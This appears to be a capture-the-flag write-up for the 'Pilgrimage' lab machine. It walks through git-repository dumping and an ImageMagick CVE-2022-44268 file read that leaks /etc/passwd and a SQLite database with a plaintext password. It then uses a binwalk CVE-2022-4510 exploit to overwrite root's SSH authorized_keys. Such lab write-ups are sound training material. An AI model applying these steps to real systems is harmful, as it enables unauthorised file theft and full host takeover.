IP=`10.10.11.219`

## Enumeration
**nmap**
```bash
export IP=10.10.11.219
nmap -p- --min-rate 10000 -Pn $IP
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
---
sudo nmap -p22,80 -sCVT -A -Pn $IP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

Domain: `pilgrimage.htb`
Nginx version: `1.18.0`
git found: `10.10.11.219:80/.git` - We can use the tool `git-dumper` that can be installed using `pipx install git-dumper` to extract the content's of the git repo present on the machine. 

The tools: [Git-Money](https://github.com/dnoiz1/git-money), [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) and [GitTools](https://github.com/internetwache/GitTools) can be used to retrieve the content of a git directory. [hacktrickz - git](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git)
The tool [https://github.com/cve-search/git-vuln-finder](https://github.com/cve-search/git-vuln-finder) can be used to search for CVEs and security vulnerability messages inside commits messages.

The tool [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob) search for sensitive data in the repositories of an organisations and its employees.

After downloading the repo, there is a lot to go through; including the source code. Also within the repository is a copy of `magick` (ImageMagick).

At this point, I decided to go and check the functionality of the site first, to which I found a file upload on `index.php`. This can be confirmed in the source code. There is also a login/register functionality. After testing the upload function and viewing the source code, upon image upload; the image was being shrinked into a smalled image, and the original one deleted/replaced with the new image. With  the copy of `magick` in the git repo, i went ahead and checked the version number so I could look for any known exploits. Version `7.1.0-49`.

Lookup term `ImageMagick 7.1.0-49 exploit`. From my research I found:
- [CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268) - Information disclosure vulnerability through arbitrary file read. When it parses a PNG image for resizing, the resulting image could have embedded the content of an arbitrary file.
- [PoC](https://github.com/entr0pie/CVE-2022-44268)
To exploit Imagemagick, generate a malicious png:

```shell
python3 CVE-2022-44268.py /etc/passwd  # Create output.png
```

Then, run a resize operation with convert:

```shell
convert output.png -resize 50% leak.png
```

Finally, inspect the leak image and convert the `Raw profile` to hex:

```shell
identify -verbose leak.png
# ...
Raw profile type:

    2367
726f6f743a783a303a303a726f6f743a2f726f6f743a2f6269 [...]
```

```bash
python -c "print(bytes.fromhex('726f6f743a783a303a303a726f6f743a2f726f6f743a2f6269 [...]'))"
```
- https://github.com/voidz0r/CVE-2022-44268
- [Exploit-db - CVE-44268](https://www.exploit-db.com/exploits/51261)
- Clone the project
`git clone https://github.com/voidz0r/CVE-2022-44268`
- Run the project
`cargo run "/etc/passwd"`
- Use the file with ImageMagick
`convert image.png -resize 50% output.png`
- Analyze the resized image
`identify -verbose output.png`
- Convert hex to str
`python3 -c 'print(bytes.fromhex("23202f6574632f686f7374730a3132372e302e302e31096c6f63616c686f73740a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3109096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a3109096970362d616c6c6e6f6465730a666630323a3a3209096970362d616c6c726f75746572730a6475636e740a"))`

After running `cargo run /etc/passwrd` and uploading the photo, then downloading the resized image and running `identify -verbose <img>`. It will output a large string of hex. After using python to convert this hex string to bytes, we can see that it is a success:
```bash
python3 u.py                    
b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
```

Users: `laurel`

From the source code, in `login.php` there is a function that connect's to an sqlite database. Let's try to grab this file and inspect the database.
```php
[SNIP]
$db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));

  if($stmt->fetchAll()) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /login.php?message=Login failed&status=fail");
  }
  [SNIP]
```

After downloading the image and extracting the data using `identify -verbose <img>`. I used python to write the binary data to a file using `open("output.db", "wb").write(bytes.fromhex(<hex_str>))` then using `sqlite` to inspect the db....

```bash
sqlite3 pilgrimage.db            
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> SHOW DATABASES;
Parse error: near "SHOW": syntax error
  SHOW DATABASES;
  ^--- error here
sqlite> .tables
images  users 
sqlite> SELECT * FROM users;
emily|abigchonkyboi123
user|user
sqlite> SELECT * FROM images;
http://pilgrimage.htb/shrunk/662c0c41a8661.png|image.png|user
```
Creds Found: `emily|abigchonkyboi123`

## Privilege escalation
After a bit of enumeration, after running `ps aux | grep root` to check for any processes running under the `root` user I was able to find the script `/usr/sbin/malwarescan.sh`
```bash
!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

I initially though I code get code execution by manipulating the file names with `$()` and \`\` However no luck...

I then decided to check the version's of the tools being used.

Running `binwalk -h` will output the `binwalk` version. 

```
binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

after giving this a quick google:
`Binwalk v2.3.2 exploit` I found the following:
[CVE-2022-4510](https://github.com/adhikara13/CVE-2022-4510-WalkingPath)
[exploit-db PoC](https://www.exploit-db.com/exploits/51249)
[Binwalk RCE - Packetstirnsecurity](https://packetstormsecurity.com/files/171724/Binwalk-2.3.2-Remote-Command-Execution.html)
A path traversal vulnerability was identified in ReFirm Labs binwalk from version 2.1.2b through 2.3.3 included. By crafting a malicious PFS filesystem file, an attacker can get binwalk's PFS extractor to extract files at arbitrary locations when binwalk is run in extraction mode (-e option). Remote code execution can be achieved by building a PFS filesystem that, upon extraction, would extract a malicious binwalk module into the folder .config/binwalk/plugins. This vulnerability is associated with program files src/binwalk/plugins/unpfs.py. This issue affects binwalk from 2.1.2b through 2.3.3 included.
- [CVE Explaination](https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/)

After downloading the PoC from github, I then generated a `ed25519` SSH key pair using the command:
`ssh-keygen -t ed25519 -N "" -f ed25519_pilgrimmage`

Then, using this key + the exploit; I was able to gain code execution and overwrite the `authorized_keys` file using the PoC. From here, i was able to easily SSH into the machine as the `root` user. 


